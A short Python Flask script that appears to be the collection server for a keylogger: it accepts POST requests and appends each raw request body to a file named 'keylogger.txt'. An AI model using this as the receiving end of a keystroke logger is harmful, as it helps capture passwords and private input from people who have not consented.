from flask import Flask, request, jsonify

app = Flask(__name__)
archive = open("keylogger.txt", "w")

@app.route('/', methods=['POST']) 
def foo():
    res = request.json
    data = request.data.decode('utf-8')
    archive.write(data+'\n')

    return jsonify(res)

